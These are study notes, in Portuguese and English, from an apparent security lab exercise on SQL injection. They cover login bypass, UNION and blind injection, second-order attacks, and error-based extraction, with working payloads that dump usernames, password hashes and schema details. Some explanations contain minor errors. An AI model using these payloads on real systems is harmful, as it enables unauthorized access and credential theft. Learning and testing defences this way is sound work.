# SQL INJECTION

## Basic SQL Injections

### SELECT * FROM users where username='".$user."' AND password = '.md5($password)."'

As we can see, the password is hashed using md5, so that's probably not the best path for us to attack from. However, the User Field is not protected at all
Se no login, na parte do username, escrevermos ```voldemort' -- //```, Isto causa que o resto da query seja ignorada
> -- // é como se faz comentarios em SQL

Assim o server recebe:

```sql
SELECT * FROM users where username='voldemort' -- //' AND password =''
```

a partir do 'voldemort', é tudo comentario. Logo, desde que voldemort seja um username existente, a query não irá ter erros e vai retornar *.

### SELECT * FROM users where (username='".$user."') AND (password = '.md5($password)."')

Aqui, temos os parenteses como extra segurança. Se fizessemos como antes ficava assim:

```sql
SELECT * FROM users where (username='voldemort' -- //') AND (password = '.md5($password)."')
```

Acaba-se com uma query mal formada, uma vez que nunca foram fechados os parenteses.

Entao, se fizermos login com o username ```voldemort') -- //```, cria a seguinte query:

```sql
 "SELECT * FROM users where username=('Voldemort') -- // ') AND password = '.md5($password). 
```

Assim já funciona a injection.

### SELECT * FROM products WHERE product_name LIKE '".$query."%'

> In SQL, a command ending in *LIKE ba%*, will return items whose names end with the substring "ba".

Neste exercício, estamos a usar uma barra de pesquisa em que nos aparecem os items que começam com a substring *".$query."*
Como não há qualquer tipo de validação, podemos fazer traquinagem

Por exemplo, se escrevermos na barra ```b%' order by 5 -- //```, o servidor vai receber a query:

```sql
SELECT * FROM products WHERE product_name LIKE 'b%' order by 5 -- //%'
```

Isto ordena a tabela resultante pela quinta coluna de dados.

Dá pa fazer mais cenas na search bar.
> The UNION operator is used to combine the result-set of two or more SELECT statements

Portanto se fizermos:

```sql
'union select null,id,username,password,fname from users -- //  
```

Cria a query:

```sql
"SELECT * FROM products WHERE product_name LIKE '% 'union select null,id,username,password,fname from users -- %' 
```

Assim, alem de aparecerem os produtos, aparece tambem uma tabela com id, username, pass ...

Se não soubermos os nomes das variáveis e tabelas, o que é muito provavel, fazemos ```'union select null,null,null,null,table_name from information_schema.tables -- //```

Isto retorna tudo o que existe na base de dados.

## SQL Second Order Attacks

This designation (Second Order Attacks) is given to attacks that result in the storage of an unsanitized piece of SQL, that is later executed by an insecure function
Por exemplo, regista-se uma conta com username e pass, mas no username injeta-se SQL. Não acontece nada de momento, mas mais tarde quando se for trocar de pass, o SQL injetado vai ser executado. ***É por isso que se chama second order.***

Utilizando ```' or 1 in (select password from users) -- //```, dá nos um erro, mas a mensagem de erro mostra nos também o que queremos:
> Warning<: 1292: Truncated incorrect DOUBLE value : (...)

(Where ==(...)== are all the passwords in the **users** table password column)

## Blind SQL Injection

A Blind SQL injection happens when an attacker is able to determine the content of the database by the result of an operation. That is, the attacker will not get data from the database, but it will get a code (Error code, true false, etc...) that provides information about the data in the database.

Neste exercício, temos uma página cujo URL tem o username do utilizador. Alterando esse valor, podemos aceder a paginas de outros utilizadores. Também podemos fazer outras coisas injetando SQL.

A query da pagina funciona da seguinte forma:

```sql
SELECT * FROM users WHERE username = '".$_GET["user"]."'
```

Utilizaremos a template ```voldemort AND TEST``` em que TEST é qualquer pedaço de código SQL.
Podemos, por exemplo, fazer: ```voldemort AND SUBSTRING((select count(id) from users), 1) = N' -- //```

Isto cria a seguinte query:

```sql
SELECT * FROM users WHERE username = '.$_GET["voldemort AND SUBSTRING((select count(id) from users), 1) = N"].'
```

> By gradually incrementing N, we can, by **trial and error** get how many users exist in the **users** table (which corresponds to how many users exist overall). We'll know we've hit jackpot (i.e N equals the number of users that exist) when information is shown on the page (meaning that our < TEST > was validated as **TRUE** !) This basically gives us a way to find out anything we want from the database, using an exhaustive, and repetitive form, by basically continously asking the query: "Is < TEST > correct? How about this"

## Error based data extraction

Voltando à pagina de login, podemos extrair informação de lá a partir de mensagens de erros.

Lembrando que esta form funciona da seguinte forma:

```sql
SELECT * FROM users where username='".$user."' AND password = '.md5($password).
```

Se escrevermos isto no login: ```' or 1 in (select @@version) -- //```, o server recebe:

```sql
SELECT * FROM users where username='' or 1 in (select @@version) -- //' AND password = '.md5($password)."'
```

Aparece na página o seguinte erro:
> Warning: 1292: Truncated incorrect DOUBLE value: '8.0.17'

Já sabemos a versao do server.

### Outras funcionalidades

#### Return the hashed password of the admin user (or any user)

```sql
' or 1 in (select password from users where username = 'admin') -- //
```

#### Get info from the **users** table

```sql
 ' or 1 in (select username from users where id=1) -- //
```

#### List the tables of the information_schema ﬁrst database. You can obtain the list of table identiﬁers (TABLE_ID) and then use this information to obtain further data (e.g. WHERE TABLE_ID=1024)

```sql
' or 1=CAST((select group_concat(name) from INFORMATION_SCHEMA.INNODB_TABLES) AS SIGNED) -- //
```

This last example allows us to dump all rows from any column in any table. It basically contacts multiple values so that the result can be included in the error message

#### List the usernames of all users stored in the users table

```sql
'or 1=CAST((select group_concat(username) from users) AS SIGNED)-- //`
```

#### List the passwords of all users stored in the users table

```sql
'or 1=CAST((select group_concat(password) from users) AS SIGNED)-- //
```
